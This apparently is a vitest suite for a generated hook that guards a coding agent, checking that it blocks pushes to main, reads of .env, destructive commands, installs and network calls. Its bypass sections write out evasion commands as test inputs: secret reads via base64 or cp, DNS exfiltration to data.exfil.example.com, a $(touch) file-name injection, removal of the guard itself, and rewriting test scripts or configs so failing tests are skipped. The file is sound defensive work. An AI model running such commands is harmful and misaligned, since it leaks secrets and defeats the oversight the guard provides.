import { execFile, spawn } from "node:child_process";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { planHardening } from "./generate.js";
import { applyHardening } from "./apply.js";
import type { Rule } from "../types.js";

const run = promisify(execFile);

const rules: Rule[] = [
  { id: "a", text: "Never push to main", category: "protect-branch", targets: ["main"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "b", text: "Never touch tests", category: "protect-tests", targets: ["tests/"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "c", text: "Never read .env", category: "protect-secrets", targets: [".env"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "d", text: "No rm -rf", category: "no-destructive", targets: [], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "e", text: "No force push", category: "no-force-push", targets: [], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "f", text: "No new deps", category: "no-install", targets: [], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "g", text: "Never touch infra/", category: "scope", targets: ["!infra/"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "h", text: "Run npm test before commit", category: "require-before", targets: ["npm test"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "i", text: "Ask before npm publish", category: "ask-first", targets: ["npm publish"], source: { kind: "prose", file: "CLAUDE.md" } },
  { id: "j", text: "No curl", category: "no-exfil", targets: [], source: { kind: "prose", file: "CLAUDE.md" } },
];

let root: string;
let hook: string;

function fire(tool: string, input: Record<string, unknown>, extra: Record<string, unknown> = {}): Promise<{ code: number; stderr: string }> {
  const payload = JSON.stringify({ cwd: root, session_id: "test-session", hook_event_name: "PreToolUse", tool_name: tool, tool_input: input, ...extra });
  return new Promise((resolve) => {
    const child = spawn("node", [hook], { cwd: root, stdio: ["pipe", "pipe", "pipe"] });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d.toString()));
    child.on("close", (code) => resolve({ code: code ?? 1, stderr }));
    child.stdin.end(payload);
  });
}

/** PostToolUse, which is where the guard records that a required step ran. */
function firePost(tool: string, input: Record<string, unknown>, response: unknown = { exit_code: 0 }): Promise<{ code: number; stderr: string }> {
  const payload = JSON.stringify({ cwd: root, session_id: "test-session", hook_event_name: "PostToolUse", tool_name: tool, tool_input: input, tool_response: response });
  return new Promise((resolve) => {
    const child = spawn("node", [hook], { cwd: root, stdio: ["pipe", "pipe", "pipe"] });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d.toString()));
    child.on("close", (code) => resolve({ code: code ?? 1, stderr }));
    child.stdin.end(payload);
  });
}

beforeAll(async () => {
  root = await fs.mkdtemp(path.join(os.tmpdir(), "pf-hook-"));
  await fs.writeFile(path.join(root, "package.json"), JSON.stringify({ type: "module", scripts: { test: "node --test tests/" } }, null, 2));
  await run("git", ["init", "-q", "-b", "main"], { cwd: root });
  await applyHardening(root, planHardening(rules));
  hook = path.join(root, ".claude", "hooks", "paperfence-guard.cjs");
});
afterAll(async () => {
  await fs.rm(root, { recursive: true, force: true });
});

describe("generated hook", () => {
  it("blocks push to main", async () => {
    const r = await fire("Bash", { command: "git push origin main" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/pushing to main/);
  });
  it("blocks commit while on main", async () => {
    const r = await fire("Bash", { command: 'git commit -m "x"' });
    expect(r.code).toBe(2);
  });
  it("allows push of a feature branch", async () => {
    const r = await fire("Bash", { command: "git push -u origin fix/typo" });
    expect(r.code).toBe(0);
  });
  it("blocks force push", async () => {
    expect((await fire("Bash", { command: "git push --force origin feature" })).code).toBe(2);
    expect((await fire("Bash", { command: "git push -f origin feature" })).code).toBe(2);
  });
  it("blocks deleting and editing committed tests, allows new and uncommitted test files", async () => {
    await fs.mkdir(path.join(root, "tests"), { recursive: true });
    await fs.writeFile(path.join(root, "tests/a.test.js"), "test('x', () => {});");
    await run("git", ["add", "tests/a.test.js"], { cwd: root });
    await run("git", ["-c", "user.email=a@b", "-c", "user.name=a", "commit", "-q", "-m", "add test"], { cwd: root });
    // a test the agent just created (untracked) is editable and removable
    await fs.writeFile(path.join(root, "tests/mine.test.js"), "test('mine', () => {});");
    expect((await fire("Edit", { file_path: path.join(root, "tests/mine.test.js") })).code).toBe(0);
    expect((await fire("Bash", { command: "rm tests/mine.test.js" })).code).toBe(0);
    expect((await fire("Bash", { command: "rm tests/a.test.js" })).code).toBe(2);
    expect((await fire("Edit", { file_path: path.join(root, "tests/a.test.js") })).code).toBe(2);
    expect((await fire("Bash", { command: "echo x > tests/a.test.js" })).code).toBe(2);
    expect((await fire("Read", { file_path: path.join(root, "tests/a.test.js") })).code).toBe(0);
    expect((await fire("Write", { file_path: path.join(root, "tests/slug.test.js") })).code).toBe(0);
    expect((await fire("Bash", { command: "cat > tests/new.test.js <<'EOF'\ntest('y', () => {});\nEOF" })).code).toBe(0);
  });
  it("blocks reading .env through Read and through the shell", async () => {
    expect((await fire("Read", { file_path: path.join(root, ".env") })).code).toBe(2);
    expect((await fire("Bash", { command: "cat .env" })).code).toBe(2);
    expect((await fire("Bash", { command: "ls && grep KEY .env" })).code).toBe(2);
    expect((await fire("Bash", { command: "cat .env.example" })).code).toBe(0);
  });
  it("blocks destructive commands in compound form", async () => {
    expect((await fire("Bash", { command: "ls && rm -rf build" })).code).toBe(2);
    expect((await fire("Bash", { command: "git reset --hard HEAD~1" })).code).toBe(2);
    expect((await fire("Bash", { command: "rm build/out.js" })).code).toBe(0);
  });
  it("blocks installs but not plain install", async () => {
    expect((await fire("Bash", { command: "npm install left-pad" })).code).toBe(2);
    expect((await fire("Bash", { command: "npm install" })).code).toBe(0);
  });
  it("blocks edits under infra/", async () => {
    expect((await fire("Edit", { file_path: path.join(root, "infra/deploy.yml") })).code).toBe(2);
    expect((await fire("Edit", { file_path: path.join(root, "src/a.js") })).code).toBe(0);
  });
  it("requires npm test before commit, on a branch", async () => {
    await run("git", ["checkout", "-q", "-b", "feature"], { cwd: root }).catch(async () => {
      await fs.writeFile(path.join(root, "x"), "x");
      await run("git", ["add", "."], { cwd: root });
      await run("git", ["-c", "user.email=a@b", "-c", "user.name=a", "commit", "-q", "-m", "init"], { cwd: root });
      await run("git", ["checkout", "-q", "-b", "feature"], { cwd: root });
    });
    const before = await fire("Bash", { command: 'git commit -m "x"' });
    expect(before.code).toBe(2);
    expect(before.stderr).toMatch(/npm test/);
    // PreToolUse alone does not count: the step has not run yet.
    await fire("Bash", { command: "npm test" });
    expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
    // A failed run does not count either.
    await fire("Bash", { command: "npm test" }, { hook_event_name: "PostToolUse", tool_response: { exit_code: 1, stdout: "", stderr: "fail" } });
    expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
    // A successful run does.
    await fire("Bash", { command: "npm test" }, { hook_event_name: "PostToolUse", tool_response: { exit_code: 0, stdout: "ok" } });
    expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(0);
  });
  it("blocks ask-first commands", async () => {
    expect((await fire("Bash", { command: "npm publish" })).code).toBe(2);
  });
  it("blocks network to outside hosts", async () => {
    expect((await fire("Bash", { command: "curl https://example.com" })).code).toBe(2);
    expect((await fire("WebFetch", { url: "https://example.com" })).code).toBe(2);
    expect((await fire("Bash", { command: "curl http://127.0.0.1:3000/health" })).code).toBe(0);
  });
});

describe("generated hook, bypass attempts", () => {
  it("push via refspec, full ref, -C, and env wrappers", async () => {
    for (const c of ["git push origin HEAD:main", "git push origin refs/heads/main", "git -C . push origin main", "GIT_TRACE=1 git push origin main", "command git push origin main", "/usr/bin/git push origin main", "git push origin feature:main"]) {
      expect((await fire("Bash", { command: c })).code, c).toBe(2);
    }
  });
  it("force push spellings", async () => {
    for (const c of ["git push -fu origin feature", "git push origin +feature", "git push --force-with-lease origin feature"]) {
      expect((await fire("Bash", { command: c })).code, c).toBe(2);
    }
  });
  it("destructive spellings", async () => {
    for (const c of ["rm -fr build", "rm -r -f build", "rm --recursive build", "/bin/rm -rf build", "find . -name '*.log' -delete", "git restore .", "echo $(rm -rf build)"]) {
      expect((await fire("Bash", { command: c })).code, c).toBe(2);
    }
  });
  it("install with flags first", async () => {
    for (const c of ["npm install --save-dev left-pad", "npm i -S lodash", "pnpm add -D vitest", "pip install requests", "uv add httpx"]) {
      expect((await fire("Bash", { command: c })).code, c).toBe(2);
    }
    expect((await fire("Bash", { command: "npm install --frozen-lockfile" })).code).toBe(0);
    expect((await fire("Bash", { command: "pip install -r requirements.txt" })).code).toBe(0);
  });
  it("secret reads through wrappers and scripts", async () => {
    for (const c of ["env cat .env", "/bin/cat ./.env", "sort < .env", "node -e \"console.log(require('fs').readFileSync('.env','utf8'))\"", "python3 -c \"print(open('.env').read())\"", "echo $(cat .env)", "grep -n = .env"]) {
      expect((await fire("Bash", { command: c })).code, c).toBe(2);
    }
  });
  it("tests-before-commit cannot be satisfied by a commit message or by chaining", async () => {
    await fs.rm(path.join(root, ".claude", ".paperfence-session-test-session.json"), { force: true });
    expect((await fire("Bash", { command: 'git commit -m "ran npm test, all good"' })).code).toBe(2);
    expect((await fire("Bash", { command: "git commit -am x; npm test" })).code).toBe(2);
  });
  it("cannot edit the hook, its policy, or settings", async () => {
    expect((await fire("Write", { file_path: path.join(root, ".claude/hooks/paperfence-guard.cjs") })).code).toBe(2);
    expect((await fire("Edit", { file_path: path.join(root, ".claude/settings.json") })).code).toBe(2);
    expect((await fire("Bash", { command: "printf 'process.exit(0)' > .claude/hooks/paperfence-guard.cjs" })).code).toBe(2);
    expect((await fire("Bash", { command: "rm .claude/hooks/policy.json" })).code).toBe(2);
    expect((await fire("Bash", { command: "sed -i '' 's/x/y/' .claude/settings.json" })).code).toBe(2);
  });
  it("forbidden paths through the shell", async () => {
    expect((await fire("Bash", { command: "sed -i.bak 's/replicas: 2/replicas: 3/' infra/deploy.yml" })).code).toBe(2);
    expect((await fire("Bash", { command: "echo x > infra/deploy.yml" })).code).toBe(2);
    expect((await fire("Bash", { command: "mv infra/deploy.yml infra/old.yml" })).code).toBe(2);
    expect((await fire("Bash", { command: "cat infra/deploy.yml" })).code).toBe(0);
  });
  it("ask-first through wrappers", async () => {
    expect((await fire("Bash", { command: "env npm publish" })).code).toBe(2);
    expect((await fire("Bash", { command: "cd pkg && npm publish --access public" })).code).toBe(2);
  });
});

describe("generated hook, review 2 cases", () => {
  it("quoted refspecs and nested wrappers", async () => {
    expect((await fire("Bash", { command: "git push origin 'HEAD:main'" })).code).toBe(2);
    expect((await fire("Bash", { command: "env command git push origin main" })).code).toBe(2);
    expect((await fire("Bash", { command: "git push origin '+HEAD:feature'" })).code).toBe(2);
    expect((await fire("Bash", { command: "git push --force-with-lease=feature origin feature" })).code).toBe(2);
    expect((await fire("Bash", { command: "echo 'safe; git push origin main'" })).code).toBe(0);
  });
  it("option-first installs and dry runs", async () => {
    expect((await fire("Bash", { command: "npm --prefix . install left-pad" })).code).toBe(2);
    expect((await fire("Bash", { command: "git clean -ndf" })).code).toBe(0);
  });
  it("tests and self through cp, rm -r, and scripts", async () => {
    expect((await fire("Bash", { command: "cp replacement.js tests/a.test.js" })).code).toBe(2);
    expect((await fire("Bash", { command: "rm -r tests" })).code).toBe(2);
    expect((await fire("Bash", { command: "rm -r .claude/hooks" })).code).toBe(2);
    expect((await fire("Bash", { command: "node -e 'require(\"fs\").writeFileSync(\".claude/hooks/paperfence-guard.cjs\",\"process.exit(0)\")'" })).code).toBe(2);
    expect((await fire("Bash", { command: "echo x > .claude/.paperfence-session-test-session.json" })).code).toBe(2);
    expect((await fire("Bash", { command: "cp infra/deploy.yml /tmp/deploy.yml" })).code).toBe(0);
  });
  it("network from scripts and sh -c", async () => {
    expect((await fire("Bash", { command: "node -e 'fetch(\"https://example.com\")'" })).code).toBe(2);
    expect((await fire("Bash", { command: "sh -c 'curl https://example.com'" })).code).toBe(2);
    expect((await fire("Bash", { command: "command -v curl" })).code).toBe(0);
  });
  it("tests-before-commit ignores chained or backgrounded test runs", async () => {
    await fs.rm(path.join(root, ".claude", ".paperfence-session-test-session.json"), { force: true });
    await fire("Bash", { command: "false && npm test || true" }, { hook_event_name: "PostToolUse", tool_response: { exit_code: 0, stdout: "" } });
    expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
    await fire("Bash", { command: "npm test &" }, { hook_event_name: "PostToolUse", tool_response: { exit_code: 0, stdout: "" } });
    expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
  });
});


/**
 * A suite can be made green without touching a single assertion: change what
 * the runner is pointed at. These are the routes that do not go through a
 * test file.
 */
describe("what decides which tests run", () => {
  it("blocks an edit to the test script in package.json", async () => {
    const r = await fire("Edit", { file_path: path.join(root, "package.json"), old_string: '"test": "node --test tests/"', new_string: '"test": "node --test tests/ --test-skip-pattern=pricing"' });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/test script/);
  });

  it("allows an edit to package.json that leaves the test script alone", async () => {
    const r = await fire("Edit", { file_path: path.join(root, "package.json"), old_string: '"type": "module"', new_string: '"type": "module",\n  "description": "a service"' });
    expect(r.code).toBe(0);
  });

  it("blocks npm pkg set on the test script, which edits package.json without an Edit call", async () => {
    const r = await fire("Bash", { command: 'npm pkg set scripts.test="exit 0"' });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/decides which tests run/);
  });

  it("blocks writing a runner config that excludes the failing test", async () => {
    const r = await fire("Write", { file_path: path.join(root, "vitest.config.ts"), content: "export default { test: { exclude: ['tests/pricing*'] } }" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/decides which tests run/);
  });

  it("blocks editing a CI workflow to drop the test job", async () => {
    const r = await fire("Edit", { file_path: path.join(root, ".github/workflows/ci.yml"), old_string: "run: npm test", new_string: "run: echo skip" });
    expect(r.code).toBe(2);
  });

  it("blocks a shell redirection over a runner config", async () => {
    const r = await fire("Bash", { command: "echo '{}' > jest.config.json" });
    expect(r.code).toBe(2);
  });

  it("blocks rm of a runner config", async () => {
    const r = await fire("Bash", { command: "rm .mocharc.yml" });
    expect(r.code).toBe(2);
  });

  it("blocks sed -i on package.json", async () => {
    const r = await fire("Bash", { command: "sed -i '' 's/node --test/exit 0/' package.json" });
    expect(r.code).toBe(2);
  });

  it("blocks a node one-liner that rewrites package.json", async () => {
    const r = await fire("Bash", { command: `node -e 'const p=require("./package.json");p.scripts.test="exit 0";require("fs").writeFileSync("package.json",JSON.stringify(p))'` });
    expect(r.code).toBe(2);
  });

  it("still allows ordinary work in a source file", async () => {
    const r = await fire("Edit", { file_path: path.join(root, "src", "pricing.js"), old_string: "100", new_string: "50" });
    expect(r.code).toBe(0);
  });

  it("still allows running the test suite", async () => {
    const r = await fire("Bash", { command: "npm test" });
    expect(r.code).toBe(0);
  });
});

describe("routes to a secret the guard must also close", () => {
  it("blocks a shell loop that names no reader program", async () => {
    expect((await fire("Bash", { command: 'while read -r l; do echo "$l"; done < .env' })).code).toBe(2);
  });
  it("blocks an encoder", async () => {
    expect((await fire("Bash", { command: "base64 .env" })).code).toBe(2);
    expect((await fire("Bash", { command: "xxd .env" })).code).toBe(2);
  });
  it("blocks a process substitution", async () => {
    expect((await fire("Bash", { command: "diff <(cat .env) /dev/null" })).code).toBe(2);
  });
  it("blocks a wrapper that hides the reader", async () => {
    expect((await fire("Bash", { command: "timeout 5 cat .env" })).code).toBe(2);
  });
  it("blocks a copy of the file", async () => {
    expect((await fire("Bash", { command: "cp .env /tmp/leak" })).code).toBe(2);
  });
  it("leaves a neighbouring file with a similar name alone", async () => {
    expect((await fire("Bash", { command: "cat .env.example" })).code).toBe(0);
  });
});

describe("ways out the guard must also close", () => {
  it("blocks a name lookup, which carries data in the label", async () => {
    expect((await fire("Bash", { command: "dig data.exfil.example.com" })).code).toBe(2);
  });
  it("blocks a remote added mid-run", async () => {
    const r = await fire("Bash", { command: "git remote add backup https://example.com/x.git" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/adding a remote/);
  });
  it("blocks a push straight to a URL", async () => {
    expect((await fire("Bash", { command: "git push https://example.com/x.git feature" })).code).toBe(2);
  });
  it("leaves an ordinary push to a configured remote alone", async () => {
    expect((await fire("Bash", { command: "git push origin feature" })).code).toBe(0);
  });
  it("leaves git remote -v alone", async () => {
    expect((await fire("Bash", { command: "git remote -v" })).code).toBe(0);
  });
});

/**
 * "Run X before Y" is a rule about Y. Compiling every one of them as
 * "before committing" blocks work that is allowed and lets through the work
 * that is not.
 */
describe("the action a required step actually gates", () => {
  let pushRoot: string;
  let pushHook: string;

  function firePush(tool: string, input: Record<string, unknown>): Promise<{ code: number; stderr: string }> {
    const payload = JSON.stringify({ cwd: pushRoot, session_id: "push-session", hook_event_name: "PreToolUse", tool_name: tool, tool_input: input });
    return new Promise((resolve) => {
      const child = spawn("node", [pushHook], { cwd: pushRoot, stdio: ["pipe", "pipe", "pipe"] });
      let stderr = "";
      child.stderr.on("data", (d) => (stderr += d.toString()));
      child.on("close", (code) => resolve({ code: code ?? 1, stderr }));
      child.stdin.end(payload);
    });
  }

  beforeAll(async () => {
    pushRoot = await fs.mkdtemp(path.join(os.tmpdir(), "pf-hook-push-"));
    await fs.writeFile(path.join(pushRoot, "package.json"), '{"type":"module"}');
    await run("git", ["init", "-q", "-b", "main"], { cwd: pushRoot });
    await applyHardening(
      pushRoot,
      planHardening([{ id: "p", text: "Always run `npm run lint` before pushing.", category: "require-before", targets: ["npm run lint", "push"], source: { kind: "prose", file: "CLAUDE.md" } }]),
    );
    pushHook = path.join(pushRoot, ".claude", "hooks", "paperfence-guard.cjs");
  });
  afterAll(async () => {
    await fs.rm(pushRoot, { recursive: true, force: true });
  });

  it("blocks the push the rule names", async () => {
    const r = await firePush("Bash", { command: "git push origin feature" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/npm run lint.*before pushing/);
  });

  it("does not block committing, which the rule says nothing about", async () => {
    expect((await firePush("Bash", { command: 'git commit -m "x"' })).code).toBe(0);
  });

  it("blocks a commit when the rule is about committing", async () => {
    // The main fixture's rule is "run npm test before committing".
    const r = await fire("Bash", { command: 'git commit -m "x"' });
    expect(r.code).toBe(2);
  });

  it("does not block a push when the rule is about committing", async () => {
    expect((await fire("Bash", { command: "git push origin feature" })).code).toBe(0);
  });
});

/**
 * Findings from the third review. Each of these was a way past the guard.
 */
describe("routes the third review found", () => {
  it("does not run a shell when checking whether a path is committed", async () => {
    // `git cat-file -e HEAD:"x$(...)"` used to go through execSync, so the
    // substitution ran. The payload here would delete the guard itself.
    const marker = path.join(root, "INJECTION_RAN");
    await fs.rm(marker, { force: true });
    const r = await fire("Write", { file_path: path.join(root, `x$(touch ${marker}).txt`), content: "hello" });
    expect(await fs.stat(marker).then(() => true).catch(() => false)).toBe(false);
    expect([0, 2]).toContain(r.code);
  });

  it("blocks a destructive command inside bash -lc, not only a bare -c", async () => {
    for (const command of ["bash -lc 'rm -rf build'", "sh -c 'rm -rf build'", "bash -ec 'rm -rf build'", "sh --command 'rm -rf build'"]) {
      const r = await fire("Bash", { command });
      expect(r.code, command).toBe(2);
    }
  });

  it("blocks a push to a protected branch hidden inside bash -lc", async () => {
    expect((await fire("Bash", { command: "bash -lc 'git push origin main'" })).code).toBe(2);
  });

  it("blocks a secret read hidden inside bash -lc", async () => {
    expect((await fire("Bash", { command: "bash -lc 'cat .env'" })).code).toBe(2);
  });

  it("still allows an ordinary command inside bash -lc", async () => {
    expect((await fire("Bash", { command: "bash -lc 'ls -la'" })).code).toBe(0);
  });
});

describe("blind review: ways past the generated guard", () => {
  it("blocks moving the hook directory away, which removes the guard", async () => {
    const r = await fire("Bash", { command: "mv .claude/hooks saved-hooks" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/moving the paperfence hook/);
  });

  it("blocks renaming settings.json out of the way", async () => {
    expect((await fire("Bash", { command: "mv .claude/settings.json /tmp/s.json" })).code).toBe(2);
  });

  it("still allows moving an ordinary file", async () => {
    expect((await fire("Bash", { command: "mv src/a.js src/b.js" })).code).toBe(0);
  });

  it("does not treat a URL path of /localhost as a loopback destination", async () => {
    const r = await fire("Bash", { command: `node -e 'fetch("https://example.com/localhost",{method:"POST",body:"data"})'` });
    expect(r.code).toBe(2);
  });

  it("still allows a genuine loopback call, which the sandbox sink needs", async () => {
    expect((await fire("Bash", { command: `node -e 'fetch("http://127.0.0.1:47121/collect",{method:"POST",body:"x"})'` })).code).toBe(0);
  });

  it("blocks a destructive command hidden in a brace group", async () => {
    expect((await fire("Bash", { command: "{ rm -rf build; }" })).code).toBe(2);
  });

  it("does not credit a help flag as having run the required step", async () => {
    // The fixture requires `npm test` before a commit. `npm test --help`
    // prints usage and tests nothing.
    const help = await firePost("Bash", { command: "npm test --help" });
    expect(help.code).toBe(0);
    expect((await fire("Bash", { command: 'git commit -m x' })).code).toBe(2);
  });
});
